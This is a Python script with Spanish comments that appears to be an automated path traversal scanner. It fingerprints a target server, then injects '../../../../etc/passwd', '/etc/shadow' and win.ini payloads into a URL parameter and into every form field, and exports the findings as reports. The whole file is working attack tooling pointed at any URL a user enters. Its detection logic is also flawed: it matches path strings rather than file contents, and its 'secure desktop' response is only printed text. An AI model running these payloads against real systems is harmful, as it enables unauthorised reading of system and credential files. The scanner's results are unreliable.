import requests
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup
import json
import csv
import pdfkit
import time
import random
import matplotlib.pyplot as plt
import os
import re

# Configuración de headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

# Archivos sensibles y clasificación de impacto
SENSITIVE_FILES = {
    "/etc/passwd": "Alta",
    "/etc/shadow": "Alta",
    "/proc/self/environ": "Alta",
    "C:\\Windows\\win.ini": "Media",
    "/root/.bash_history": "Baja",
}

# Payloads para Path Traversal
PAYLOADS_LINUX = ["../../../../etc/passwd", "../../../../etc/shadow"]
PAYLOADS_WINDOWS = ["..\\..\\..\\Windows\\win.ini"]

# **1. Reconocimiento Automático del SO del Servidor**
def detect_server_os(url):
    """Detecta el sistema operativo del servidor analizando cabeceras y respuestas."""
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        server_header = response.headers.get('Server', '').lower()
        
        if "windows" in server_header or "microsoft" in server_header:
            return "windows"
        elif "linux" in server_header or "ubuntu" in server_header or "debian" in server_header:
            return "linux"
        else:
            return "desconocido"
    except:
        return "desconocido"

# **2. Exploración Automática de Rutas y Formularios**
def extract_forms(url):
    """Extrae formularios de la página."""
    response = requests.get(url, headers=HEADERS, timeout=10)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all("form")

    extracted_forms = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = {input_tag.get("name"): "" for input_tag in form.find_all("input") if input_tag.get("name")}
        extracted_forms.append({'url': urljoin(url, action), 'method': method, 'data': inputs})

    return extracted_forms

def scan_path_traversal(url, os_type):
    """Realiza el escaneo de Path Traversal."""
    payloads = PAYLOADS_LINUX if os_type == "linux" else PAYLOADS_WINDOWS
    detected_vulnerabilities = []

    for payload in payloads:
        encoded_payload = quote(payload)
        test_url = f"{url}?file={encoded_payload}"
        response = requests.get(test_url, headers=HEADERS, timeout=5)

        for sensitive_file in SENSITIVE_FILES.keys():
            if sensitive_file in response.text:
                detected_vulnerabilities.append({"url": test_url, "file": sensitive_file, "impact": SENSITIVE_FILES[sensitive_file]})

    return detected_vulnerabilities

# **3. Visualización Gráfica de Resultados**
def generate_visualization(vulnerabilities):
    """Genera una gráfica de barras con el impacto de las vulnerabilidades detectadas."""
    if not vulnerabilities:
        print("No se encontraron vulnerabilidades.")
        return

    categories = ["Alta", "Media", "Baja"]
    counts = {category: 0 for category in categories}

    for v in vulnerabilities:
        counts[v["impact"]] += 1

    plt.bar(counts.keys(), counts.values(), color=['red', 'orange', 'yellow'])
    plt.xlabel("Nivel de Impacto")
    plt.ylabel("Cantidad de Vulnerabilidades")
    plt.title("Clasificación de Vulnerabilidades Detectadas")
    plt.show()

# **4. Exportación de Resultados a JSON, CSV y PDF**
def export_results(vulnerabilities):
    """Exporta los resultados a JSON, CSV y PDF."""
    timestamp = time.strftime("%Y%m%d-%H%M%S")

    # JSON
    json_filename = f"report_{timestamp}.json"
    with open(json_filename, 'w') as json_file:
        json.dump(vulnerabilities, json_file, indent=4)

    # CSV
    csv_filename = f"report_{timestamp}.csv"
    with open(csv_filename, 'w', newline='') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["URL", "Archivo Detectado", "Impacto"])
        for v in vulnerabilities:
            writer.writerow([v["url"], v["file"], v["impact"]])

    # PDF
    pdf_filename = f"report_{timestamp}.pdf"
    html_content = f"<h1>Reporte de Vulnerabilidades - {timestamp}</h1><ul>"
    for v in vulnerabilities:
        html_content += f"<li>URL: {v['url']} - Archivo: {v['file']} - Impacto: {v['impact']}</li>"
    html_content += "</ul>"

    pdfkit.from_string(html_content, pdf_filename)

    print(f"\nResultados exportados:\nJSON: {json_filename}\nCSV: {csv_filename}\nPDF: {pdf_filename}")

# **5. Simulación de Respuesta del Sistema**
def simulate_secure_desktop(vulnerabilities):
    """Simula un entorno seguro y la respuesta ante intentos de explotación."""
    print("\nSimulando escritorio seguro ante intentos de explotación...")
    
    for v in vulnerabilities:
        if v["impact"] == "Alta":
            print(f"[ALERTA] Se intentó acceder a {v['file']}. ¡Sistema bloqueando intento!")
        elif v["impact"] == "Media":
            print(f"[ADVERTENCIA] Acceso sospechoso a {v['file']}. Se recomienda supervisión.")
        else:
            print(f"[INFO] Acceso a {v['file']} registrado.")

# **Función Principal**
def main():
    """Función principal que ejecuta el análisis de Path Traversal."""
    print("------ Escaneo de Path Traversal ------\n")
    url = input("Introduce la URL que deseas analizar: ").strip()

    print("\nDetectando sistema operativo del servidor...")
    os_type = detect_server_os(url)
    print(f"SO Detectado: {os_type}")

    print("\nIniciando escaneo automático de rutas y formularios...")
    vulnerabilities = scan_path_traversal(url, os_type)

    # Extracción de formularios y prueba en ellos
    forms = extract_forms(url)
    for form in forms:
        for payload in (PAYLOADS_LINUX if os_type == "linux" else PAYLOADS_WINDOWS):
            test_data = form["data"]
            for key in test_data.keys():
                test_data[key] = payload
            response = requests.post(form["url"], data=test_data, headers=HEADERS)
            if any(file in response.text for file in SENSITIVE_FILES):
                vulnerabilities.append({"url": form["url"], "file": payload, "impact": "Alta"})

    if vulnerabilities:
        print("\nVulnerabilidades detectadas:")
        for v in vulnerabilities:
            print(f"- {v['url']} -> {v['file']} (Impacto: {v['impact']})")
    else:
        print("\nNo se encontraron vulnerabilidades.")

    # Generar visualización
    generate_visualization(vulnerabilities)

    # Exportar resultados
    export_results(vulnerabilities)

    # Simular respuesta del sistema
    simulate_secure_desktop(vulnerabilities)

if __name__ == "__main__":
    main()
